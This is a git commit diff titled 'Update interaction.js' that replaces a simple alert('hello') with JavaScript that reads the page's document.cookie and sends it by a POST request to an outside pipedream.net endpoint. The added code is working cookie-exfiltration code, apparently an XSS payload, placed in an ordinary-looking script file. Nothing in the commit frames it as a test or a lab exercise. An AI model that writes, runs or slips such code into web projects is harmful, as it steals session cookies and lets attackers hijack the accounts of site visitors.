178f3995f68ab0aecf9e3b0537bf691bd1a0ea96
paras98 <32601927+paras98@users.noreply.github.com>
2024-02-16 16:14:28 -0500

    Update interaction.js

--- interaction.js
+++ interaction.js
@@ -1,1 +1,29 @@
-alert("hello");
+	alert("hello");
+	cookieValue = document.cookie;
+
+            const headers = new Headers();
+            headers.append("Content-Type", "application/json");
+
+            const body = {
+                "cookie": cookieValue
+            };
+
+            const options = {
+                method: "POST",
+                headers,
+                mode: "cors",
+                body: JSON.stringify(body)
+            };
+
+            fetch("https://eobr7f81g93j2x7.m.pipedream.net", options)
+            .then(response => {
+                if (response.ok) {
+                    alert('Cookie sent successfully');
+                } else {
+                    alert('Failed to send cookie');
+                }
+            })
+            .catch(error => {
+                alert('Error sending cookie:', error);
+            });
+ 
